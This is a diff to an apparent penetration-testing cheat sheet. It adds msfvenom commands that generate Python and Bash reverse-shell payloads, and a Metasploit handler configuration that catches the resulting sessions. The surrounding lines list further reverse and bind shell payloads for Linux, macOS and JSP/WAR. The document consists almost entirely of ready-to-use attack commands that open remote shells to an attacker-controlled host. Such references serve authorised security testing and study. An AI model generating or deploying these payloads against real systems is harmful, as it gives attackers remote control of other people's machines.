@@ -95,6 +95,16 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > FILE.elf
 ```bash
 # msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP) LPORT=(PORT) -f macho > FILE.macho
 ```
+### Scripting Payloads
+---
+#### Python Reverse Shell
+```bash 
+# msfvenom -p cmd/unix/reverse_python LHOST=(IP) LPORT=(PORT) -f raw > FILE.py
+```
+#### Bash Reverse
+```bash
+# msfvenom -p cmd/unix/reverse_bash LHOST=(IP) LPORT=(PORT) -f raw > FILE.sh
+```
 ### Web Payloads
 ---
 #### PHP 
@@ -114,7 +124,15 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > FILE.elf
 # msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP) LPORT=(PORT) -f war > FILE.war
 ```
 
-
+### Metasploit Handler
+---
+```
+msf> set PAYLOAD (PAYLOAD)
+msf> set LHOST (IP)
+msf> set LPORT (PORT)
+msf> set ExitOnSession false
+msf> exploit -j -z
+```
 
 
 
